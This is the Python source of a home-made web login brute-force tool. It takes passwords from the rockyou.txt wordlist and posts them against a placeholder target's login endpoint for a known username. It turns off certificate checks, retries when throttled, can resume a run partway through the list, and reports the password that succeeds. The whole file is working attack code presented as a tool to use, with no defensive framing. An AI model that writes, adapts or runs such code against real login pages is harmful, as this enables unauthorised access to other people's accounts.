#################################################################################
# Login brute force tool I wrote for when any other old tool won't do the trick #
#################################################################################
import urllib2
import ssl
import urllib
import cookielib
import threading
import sys
import Queue
from StringIO import StringIO
import gzip
import time

# TARGET SPECIFIC INFORMATION ======================================
user = "bob"  # known user account
wordlist_file = "rockyou.txt"
resume_at_word = ""
target_url = "https://whoever.com"
target_post = target_url + "/platinum/data.aspx?WJAPP.Framework.Desktop.login"
fail_check = 'Invalid login information - 006","ErrorCode":3'  # Login failed error message
# ==================================================================

# Options for validating certificates
#     ssl.CERT_NONE
#     ssl.CERT_OPTIONAL
#     ssl.CERT_REQUIRED
verify_cert = ssl.CERT_NONE
time_start = time.time()
user_thread = 1


print "  _   _             _____            "
print " | \ | |           / ____|           "
print " |  \| | _____   _| |     ___  _ __ "
print " | . ` |/ _ \ \ / / |    / _ \| '_ \ "
print " | |\  | (_) \ V /| |___| (_) | | | |"
print " |_| \_|\___/ \_/  \_____\___/|_| |_|"
print "  CUSTOM WEB LOGIN BRUTE FORCE TOOL  "
print ""
print "  Bruting:", target_post
print "  Wordlist:", wordlist_file
print "  Username:", user
print ""


class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = verify_cert

        list_size = self.password_q.qsize()
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar), urllib2.HTTPSHandler(context=context))
            opener.addheaders = [('Accept-Encoding', 'gzip, deflate, br')]
            try:
                opener.open(target_url)
            except urllib2.URLError, e:
                print "  Get request failed, probably timed out. Password:", brute
                continue

            progress(list_size - self.password_q.qsize(), list_size, brute)

            # TARGET SPECIFIC CODE=========================================================
            # This section will need to be modified to meet the demands of the target
            # application
            post_tags = [
                ("tranID", 9),
                ("c", "WJAPP.Framework.Desktop"),
                ("m", "login"),
                ("rt", ""),
                ("params", '{"UserID":"%s","Password":"%s"}' % (self.username, brute))
            ]
            login_data = urllib.urlencode(post_tags)

            try_again = True
            login_result = ""
            while try_again:
                try:
                    login_response = opener.open(target_post, login_data)
                except urllib2.URLError, e:
                    print "  Post request failed, probably timed out. Password:", brute
                    continue
                buf = StringIO(login_response.read())
                login_result = gzip.GzipFile(fileobj=buf).read()
                if 'wait' not in login_result:
                    try_again = False
            # END TARGET SPECIFIC CODE=====================================================

            if fail_check not in login_result:
                self.found = True
                print "\n[*]", login_result
                print "[*]Username: %s" % self.username
                print "[*]Password: %s" % brute
        print "\n"


def build_wordlist(wl, resume=None):
    if resume == "":
        resume = None
    fd = open(wl, "rb")
    raw_words = fd.readlines()
    fd.close()

    found_resume = False
    words = Queue.Queue()

    for word in raw_words:
        word = word.rstrip()

        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print "  Resuming wordlist from: %s" % resume
        else:
            words.put(word)

    return words


def progress(count, total, status=''):
    bar_len = 60
    percents = round(100.0 * count / float(total), 1)
    filled_len = int((count/float(total)) * bar_len)

    bar = u'\u2588' * filled_len + '_' * (bar_len - filled_len)
    seconds = time.time() - time_start
    if seconds < 60:
        pass_per_min = int((60 / seconds) * count)
    else:
        pass_per_min = int(count / (seconds / 60))

    seconds_remaining = int(float((total - count) / pass_per_min) * 60)
    if seconds_remaining < 60:
        remaining = "%d secs remaining" % seconds_remaining
    elif seconds_remaining < 3600:
        remaining = "%d mins remaining" % (seconds_remaining / 60)
    elif seconds_remaining < 86400:
        remaining = "%d hours %d mins remaining" % (int(seconds_remaining / 3600), int((seconds_remaining % 3600) / 60))
    else:
        remaining = "%d days remaining" % int(seconds_remaining / 86400)

    sys.stdout.write('  [%s]%s%s [%d guesses/min] [%s] [%s]               \r' % (bar, percents, '%', pass_per_min, remaining, status))


my_words = build_wordlist(wordlist_file, resume=resume_at_word)
bruter_obj = Bruter(user, my_words)
bruter_obj.run_bruteforce()
